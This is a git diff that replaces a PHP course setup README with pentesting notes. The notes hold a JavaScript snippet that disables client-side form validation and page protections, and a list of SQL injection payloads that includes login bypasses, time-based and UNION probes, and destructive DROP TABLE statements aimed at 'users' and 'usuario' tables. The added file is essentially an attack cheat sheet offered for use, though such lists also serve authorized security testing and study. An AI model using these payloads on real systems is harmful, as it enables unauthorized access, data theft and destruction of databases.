@@ -1,97 +1,104 @@
-# Desarrollo de software 7 php
+# Pentesting
 
-## Install
+## Attack
 
-### Windows
+### Utils
+
+#### 1 Disable validation
+
+```js
+// Config
+{
+    // disable built-in validation
+    HTMLInputElement.prototype.checkValidity = () => true;
+    HTMLFormElement.prototype.checkValidity = () => true;
+    HTMLTextAreaElement.prototype.checkValidity = () => true;
+    HTMLSelectElement.prototype.checkValidity = () => true;
 
 
-**server**
+    // remove attribute validation
+    document.querySelectorAll("*").forEach(element => {
+        element.removeAttribute("required");
+        element.removeAttribute("minlength");
+        element.removeAttribute("maxlength");
+        element.removeAttribute("pattern");
+        element.removeAttribute("min");
+        element.removeAttribute("max");
+        element.removeAttribute("step");
+        element.removeAttribute("disabled");
+        element.removeAttribute("type");
+    });
+
+
+    // change input type = text;
+    document.querySelectorAll("input").forEach(input => {
+        input.type = "text";
+    });
+
+
+    // override custom validation messages
+    document.querySelectorAll("input, textarea, select").forEach(element => {
+        element.setCustomValidity("");
+    });
+
+    // remove event validation
+    document.querySelectorAll("input, textarea, select, form").forEach(element => {
+        element.oninput = null;
+        element.onchange = null;
+        element.onblur = null;
+        element.onsubmit = null;
+    });
+
+    // stop java script from blocking submission
+    document.querySelectorAll("form").forEach(form => {
+        form.addEventListener("submit", function(event) {
+            // prevent listener 
+            event.stopPropagation();
+        }, true);
+    });
+
+    // disable copy paste protection
+    document.oncopy = null;
+    document.onpaste = null;
+
+    // disable right click protection by removing custom context
+    document.oncontextmenu = null;
+
+    // disable validation for all the form
+    const forms = document.querySelectorAll("form");    
+    forms.forEach(form => {
+        form.noValidate = true;
+    });
+
+
+    {
+        window.outerWidth = window.innerWidth;
+        for (let i = 0; i < 10000; i++) {
+            clearInterval(i);
+        }
+    }
+
+    console.log("Client-site validation disabled \^w^/");
+}
 ```
-C:\xampp\htdocs\
-```
+### 2 Manual
 
-
-## Server
-
-```
-http://localhost:80
-http://localhost/
-http://localhost/public/index.php
-
-load cache = ctrl + shift + r
-```
-### FreeBSD
-
-```
-pkg install 
-php84
-php84-opcache 
-php84-mbstring
-php84-composer
-php84-pecl-xdebug
-
-debug:
-php84-fpm
-mod_php84
-```
-
-### Composer
-
-(getcomposer)[https://getcomposer.org]
-
-(getcomposer download)[https://getcomposer.org/download]
-
-(debug_backtrace)[https://www.php.net/manual/en/function.debug-backtrace.php]
-
-
-
-## Commands
-
-```
-php --version
-php --ini
-
-<?php phpinfo() ?>
-```
-
-```
-mkdir -p /usr/local/www/debug/
-/usr/local/www/debug/
-```
-
-```
-composer --version
-composer init
-```
-
-```
-mysql -u root -p < db.sql
-mysql -u root -p < db.sql
-mysql -u root -p -D empresa -e "SELECT * FROM usuario;"
-ALTER USER 'root'@'localhost' IDENTIFIED BY 'NewPassword123!';
-FLUSH PRIVILEGES;
-exit
-
-
-nvim ~/.my.cnf
-chmod 600 ~/.my.cnf
-mysql -e "SELECT 1;"
-
-mysql < db.sql
-mysql -D empresa -e "SELECT * FROM usuario;"
-
-```
-
-## Makefile
-```
-make debug input="parcial_1"
-```
-
-## Glosario
+#### SQL Injection 
 
 ```
-https://www.w3schools.com/PHP/func_misc_exit.asp
-https://www.w3schools.com/PHP/func_misc_die.asp
-https://docs.php.earth/faq/misc/structure/
-https://stackoverflow.com/questions/41209349/requirevendor-autoload-php-failed-to-open-stream
+' OR SLEEP(5) --
+' OR 1=1 --
+" OR "1"="1"
+admin'--
+admin' --
+'; DROP TABLE users;--
+'; DROP TABLE usuario;--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL, NULL --
+' OR 'x'='x
+admin'/*
+' AND 1=1 --
+' AND 1=2 --
+1 OR 1=1--
+1 OR 1=1
 ```
